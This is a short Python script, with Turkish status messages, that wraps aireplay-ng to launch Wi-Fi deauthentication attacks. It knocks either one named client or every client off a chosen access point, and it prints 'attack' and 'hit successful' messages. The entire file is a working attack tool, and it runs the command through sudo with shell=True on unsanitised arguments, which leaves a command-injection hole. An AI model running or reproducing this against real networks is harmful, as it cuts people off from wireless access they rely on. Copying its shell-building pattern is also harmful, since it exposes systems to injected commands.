import subprocess

def pulse_kick(interface, bssid, client=None, packets=15):
    if client:
        print(f"\n    [*] Hedef cihaz ({client}) ağdan düşürülüyor...")
        cmd = f"sudo aireplay-ng -0 {packets} -a {bssid} -c {client} {interface}"
    else:
        print(f"\n    [*] Tüm ağ ({bssid}) hedef alınıyor...")
        cmd = f"sudo aireplay-ng -0 {packets} -a {bssid} {interface}"
    
    try:
        subprocess.run(cmd, shell=True)
        print(f"    [✔] Vuruş başarılı.")
    except:
        print(f"    [✘] Saldırı başarısız!")